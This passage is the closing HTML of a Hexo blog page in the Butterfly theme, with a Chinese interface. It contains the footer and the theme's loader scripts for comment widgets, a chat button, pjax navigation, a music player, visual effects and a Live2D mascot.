2025-09-28 18:15:30">2025-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikooo-one.vercel.app/',
      region: 'us-east-1',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikooo-one.vercel.app/',
      region: 'us-east-1',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
      avatar: 'monsterid',
      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Twikoo' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
  window.tidioChatApi.hide();
  window.tidioChatApi.on("close", function() {
    window.tidioChatApi.hide();
  });
}
if (window.tidioChatApi) {
  window.tidioChatApi.on("ready", onTidioChatApiReady);
} else {
  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
}

var chatBtnFn = () => {
  document.getElementById("chat_btn").addEventListener("click", function(){
    window.tidioChatApi.show();
    window.tidioChatApi.open();
  });
}
chatBtnFn()
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>